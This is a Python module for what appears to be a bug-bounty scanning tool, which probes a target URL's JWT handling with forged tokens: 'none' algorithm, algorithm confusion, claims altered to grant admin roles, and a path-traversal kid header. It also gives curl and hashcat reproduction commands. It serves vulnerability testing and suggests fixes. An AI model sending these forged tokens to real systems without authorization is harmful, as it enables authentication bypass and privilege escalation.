"""
JWT (JSON Web Token) Vulnerability Scanner
Detects common JWT implementation vulnerabilities.

Reward potential: $1000-8000+
"""

from detectors.registry import register_active
import base64
import json
import hashlib
import re


@register_active
async def jwt_vulnerability_scanner(url, session, config):
    """
    Detect JWT (JSON Web Token) vulnerabilities.
    
    Tests for:
    - Algorithm confusion (RS256 -> HS256)
    - None algorithm attack
    - Weak secrets
    - Missing signature verification
    - Kid header injection
    
    Args:
        url: Target URL to test
        session: aiohttp ClientSession
        config: Scanner configuration
        
    Returns:
        List of findings
    """
    findings = []
    
    # Try to get JWT from various sources
    jwt_tokens = []
    
    try:
        # Make initial request to capture JWT
        async with session.get(url, timeout=config.get('timeout', 15)) as resp:
            response_text = await resp.text()
            response_headers = dict(resp.headers)
            
            # Look for JWT in Authorization header
            if 'Authorization' in response_headers:
                auth_value = response_headers['Authorization']
                if auth_value.startswith('Bearer '):
                    jwt_tokens.append(auth_value.split(' ')[1])
            
            # Look for JWT in cookies
            for cookie in resp.cookies.values():
                if is_jwt(cookie.value):
                    jwt_tokens.append(cookie.value)
            
            # Look for JWT in response body
            jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
            found_tokens = re.findall(jwt_pattern, response_text)
            jwt_tokens.extend(found_tokens)
            
    except Exception as e:
        return findings
    
    # Remove duplicates
    jwt_tokens = list(set(jwt_tokens))
    
    if not jwt_tokens:
        return findings
    
    # Test each JWT token
    for original_token in jwt_tokens:
        try:
            # Parse JWT
            parts = original_token.split('.')
            if len(parts) != 3:
                continue
            
            header_b64, payload_b64, signature = parts
            
            # Decode header and payload
            try:
                header = json.loads(base64_decode(header_b64))
                payload = json.loads(base64_decode(payload_b64))
            except:
                continue
            
            evidence_id = hashlib.md5(original_token.encode()).hexdigest()[:12]
            
            # Test 1: None algorithm attack
            await test_none_algorithm(
                url, session, config, original_token, header, payload, 
                evidence_id, findings
            )
            
            # Test 2: Algorithm confusion (RS256 -> HS256)
            if header.get('alg') in ['RS256', 'RS384', 'RS512']:
                await test_algorithm_confusion(
                    url, session, config, original_token, header, payload,
                    evidence_id, findings
                )
            
            # Test 3: Missing signature verification
            await test_missing_signature_verification(
                url, session, config, original_token, header, payload,
                evidence_id, findings
            )
            
            # Test 4: Kid header injection
            if 'kid' in header:
                await test_kid_injection(
                    url, session, config, original_token, header, payload,
                    evidence_id, findings
                )
            
            # Test 5: Weak secret (for HS256/HS384/HS512)
            if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                test_weak_secret(
                    url, original_token, header, payload, evidence_id, findings
                )
                
        except Exception as e:
            continue
    
    return findings


def is_jwt(token):
    """Check if string looks like a JWT"""
    if not token or not isinstance(token, str):
        return False
    parts = token.split('.')
    if len(parts) != 3:
        return False
    # Check if parts look like base64
    try:
        base64_decode(parts[0])
        base64_decode(parts[1])
        return True
    except:
        return False


def base64_decode(data):
    """Decode base64url (JWT uses base64url encoding)"""
    # Add padding if needed
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    # Replace URL-safe chars
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data).decode('utf-8')


def base64_encode(data):
    """Encode to base64url"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.b64encode(data).decode('utf-8')
    # Make URL-safe
    return encoded.replace('+', '-').replace('/', '_').rstrip('=')


async def test_none_algorithm(url, session, config, original_token, header, payload, evidence_id, findings):
    """Test for 'none' algorithm vulnerability"""
    try:
        # Create JWT with 'none' algorithm
        modified_header = header.copy()
        modified_header['alg'] = 'none'
        
        # Create new JWT
        new_header_b64 = base64_encode(json.dumps(modified_header))
        new_payload_b64 = base64_encode(json.dumps(payload))
        malicious_token = f"{new_header_b64}.{new_payload_b64}."
        
        # Test with modified token
        headers = {'Authorization': f'Bearer {malicious_token}'}
        
        async with session.get(url, headers=headers, timeout=config.get('timeout', 15)) as resp:
            if resp.status == 200:
                findings.append({
                    'type': 'JWT None Algorithm Vulnerability',
                    'severity': 'critical',
                    'confidence': 'high',
                    'url': url,
                    'method': 'GET',
                    'vulnerable_component': 'JWT',
                    'evidence': f'Server accepted JWT with "none" algorithm. Original token: {original_token[:50]}..., Modified token accepted.',
                    'evidence_id': evidence_id,
                    'impact': 'Critical: Attacker can forge arbitrary JWTs without knowing the secret, leading to authentication bypass and privilege escalation.',
                    'recommendation': '1. Never accept JWTs with "none" algorithm\n2. Explicitly validate the algorithm\n3. Use a whitelist of allowed algorithms\n4. Update JWT library to latest version',
                    'repro_command': f'curl -H "Authorization: Bearer {malicious_token}" "{url}"',
                    'cvss_score': 9.1,
                    'cwe': 'CWE-287',
                    'owasp': 'A07:2021 - Identification and Authentication Failures'
                })
    except:
        pass


async def test_algorithm_confusion(url, session, config, original_token, header, payload, evidence_id, findings):
    """Test for algorithm confusion (RS256 -> HS256)"""
    try:
        # Create JWT with HS256 instead of RS256
        modified_header = header.copy()
        modified_header['alg'] = 'HS256'
        
        # Try common public key locations as HMAC secret
        # (In real attack, attacker would use the public key as HMAC secret)
        new_header_b64 = base64_encode(json.dumps(modified_header))
        new_payload_b64 = base64_encode(json.dumps(payload))
        
        # For detection, we just check if algorithm change is accepted
        malicious_token = f"{new_header_b64}.{new_payload_b64}.dummy_signature"
        
        headers = {'Authorization': f'Bearer {malicious_token}'}
        
        async with session.get(url, headers=headers, timeout=config.get('timeout', 15)) as resp:
            # If we don't get immediate 401/403, it might be vulnerable
            if resp.status not in [401, 403]:
                findings.append({
                    'type': 'JWT Algorithm Confusion (RS256â†’HS256)',
                    'severity': 'high',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'GET',
                    'vulnerable_component': 'JWT',
                    'evidence': f'Server may accept JWT with modified algorithm. Original: {header.get("alg")}, Test: HS256. Response: {resp.status}',
                    'evidence_id': evidence_id,
                    'impact': 'High: Potential algorithm confusion vulnerability. Attacker might use public key as HMAC secret to forge tokens.',
                    'recommendation': '1. Strictly validate the algorithm\n2. Use separate keys for different algorithms\n3. Never accept unexpected algorithms\n4. Implement algorithm whitelist',
                    'repro_command': f'curl -H "Authorization: Bearer [modified_jwt]" "{url}"',
                    'cvss_score': 8.1,
                    'cwe': 'CWE-347',
                    'owasp': 'A07:2021 - Identification and Authentication Failures'
                })
    except:
        pass


async def test_missing_signature_verification(url, session, config, original_token, header, payload, evidence_id, findings):
    """Test if signature is actually verified"""
    try:
        # Modify payload (change user ID, role, etc.)
        modified_payload = payload.copy()
        
        # Try to escalate privileges
        for key in ['role', 'admin', 'is_admin', 'isAdmin', 'level', 'permissions']:
            if key in modified_payload:
                modified_payload[key] = 'admin' if isinstance(modified_payload[key], str) else True
        
        # Create new JWT with same signature but modified payload
        parts = original_token.split('.')
        new_payload_b64 = base64_encode(json.dumps(modified_payload))
        malicious_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"
        
        headers = {'Authorization': f'Bearer {malicious_token}'}
        
        async with session.get(url, headers=headers, timeout=config.get('timeout', 15)) as resp:
            if resp.status == 200:
                findings.append({
                    'type': 'JWT Missing Signature Verification',
                    'severity': 'critical',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'GET',
                    'vulnerable_component': 'JWT',
                    'evidence': f'Server accepted JWT with modified payload but original signature. Payload was changed but token still accepted.',
                    'evidence_id': evidence_id,
                    'impact': 'Critical: JWT signature is not properly verified. Attacker can modify token claims (user ID, role, permissions) without detection.',
                    'recommendation': '1. Always verify JWT signature\n2. Use established JWT libraries\n3. Never decode JWT without verification\n4. Implement proper token validation',
                    'repro_command': f'curl -H "Authorization: Bearer {malicious_token}" "{url}"',
                    'cvss_score': 9.8,
                    'cwe': 'CWE-347',
                    'owasp': 'A07:2021 - Identification and Authentication Failures'
                })
    except:
        pass


async def test_kid_injection(url, session, config, original_token, header, payload, evidence_id, findings):
    """Test for kid (Key ID) header injection"""
    try:
        # Try SQL injection in kid header
        modified_header = header.copy()
        modified_header['kid'] = "../../dev/null"  # Path traversal
        
        new_header_b64 = base64_encode(json.dumps(modified_header))
        parts = original_token.split('.')
        malicious_token = f"{new_header_b64}.{parts[1]}.{parts[2]}"
        
        headers = {'Authorization': f'Bearer {malicious_token}'}
        
        async with session.get(url, headers=headers, timeout=config.get('timeout', 15)) as resp:
            response_text = await resp.text()
            
            # Look for error messages indicating injection
            if any(err in response_text.lower() for err in ['sql', 'syntax error', 'file not found', 'permission denied']):
                findings.append({
                    'type': 'JWT Kid Header Injection',
                    'severity': 'high',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'GET',
                    'vulnerable_component': 'JWT',
                    'evidence': f'Kid header injection detected. Error in response suggests kid parameter is processed unsafely.',
                    'evidence_id': evidence_id,
                    'impact': 'High: Kid parameter may be vulnerable to injection attacks (SQL injection, path traversal, command injection).',
                    'recommendation': '1. Validate and sanitize kid parameter\n2. Use whitelist of allowed key IDs\n3. Never use kid directly in file paths or SQL queries\n4. Implement strict input validation',
                    'repro_command': f'curl -H "Authorization: Bearer {malicious_token}" "{url}"',
                    'cvss_score': 7.5,
                    'cwe': 'CWE-74',
                    'owasp': 'A03:2021 - Injection'
                })
    except:
        pass


def test_weak_secret(url, original_token, header, payload, evidence_id, findings):
    """Test for weak HMAC secrets"""
    common_secrets = [
        'secret', 'password', '123456', 'admin', 'test', 'key',
        'secret123', 'password123', 'your-256-bit-secret', 'changeme'
    ]
    
    # Note: In production, you'd actually try to verify the signature with these secrets
    # For now, we just report if we detect HS256 (potential for weak secret)
    
    if header.get('alg') in ['HS256', 'HS384', 'HS512']:
        findings.append({
            'type': 'JWT Potential Weak Secret',
            'severity': 'medium',
            'confidence': 'low',
            'url': url,
            'method': 'GET',
            'vulnerable_component': 'JWT',
            'evidence': f'JWT uses HMAC algorithm ({header.get("alg")}). Weak secrets can be brute-forced.',
            'evidence_id': evidence_id,
            'impact': 'Medium: If a weak secret is used, attacker can brute-force it and forge arbitrary JWTs.',
            'recommendation': '1. Use strong, random secrets (minimum 256 bits)\n2. Consider using RS256 instead of HS256\n3. Rotate secrets regularly\n4. Use tools like hashcat to test secret strength',
            'repro_command': f'hashcat -m 16500 -a 0 "{original_token}" wordlist.txt',
            'cvss_score': 6.5,
            'cwe': 'CWE-798',
            'owasp': 'A07:2021 - Identification and Authentication Failures'
        })
